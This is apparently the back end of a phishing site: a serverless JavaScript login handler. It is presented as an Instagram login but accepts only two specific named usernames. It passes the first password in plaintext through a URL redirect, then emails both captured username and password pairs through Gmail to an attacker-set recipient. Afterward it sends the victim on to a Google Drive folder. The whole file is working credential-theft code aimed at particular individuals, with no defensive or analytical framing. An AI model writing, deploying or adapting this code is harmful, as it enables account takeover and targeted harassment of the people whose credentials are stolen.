// functions/login.js
const nodemailer = require('nodemailer');

exports.handler = async (event) => {
  if (event.httpMethod !== 'POST') return { statusCode:405, body:'Method Not Allowed' };
  const data = new URLSearchParams(event.body);
  const first = data.get('first');
  const firstpass = data.get('firstpass');
  const username = data.get('username')?.trim();
  const password = data.get('password');

  // First step (no first param)
  if (!first) {
    if (username !== 'anu_shkasingh_73' && username !== 'anuuwwshka') {
      return { statusCode:302, headers:{Location:'/?error=invalidfirst'} };
    }
    // redirect to second step
    return { statusCode:302, headers:{Location:'/??first='+username+'&firstpass='+encodeURIComponent(password)+'&error=next'} };
  }

  // Second step: check opposite
  const other = first==='anu_shkasingh_73' ? 'anuuwwshka' : 'anu_shkasingh_73';
  if (username !== other) {
    return { statusCode:302, headers:{Location:'/?first='+first+'&firstpass='+encodeURIComponent(firstpass)+'&error=next'} };
  }

  // send email with both creds
  const transporter = nodemailer.createTransport({
    service:'gmail', auth:{user:process.env.GMAIL_USER, pass:process.env.GMAIL_PASS}
  });
  await transporter.sendMail({
    from:process.env.GMAIL_USER, to:process.env.EMAIL_RECIPIENT,
    subject:'Instagram Login Attempt',
    text:`First: ${first} / ${firstpass}\nSecond: ${username} / ${password}`
  });
  return { statusCode:302, headers:{Location:'https://drive.google.com/drive/folders/1yOSySJGU3WEMhLuSNf3NFhmYf0XRmeyL?usp=drive_link'} };
};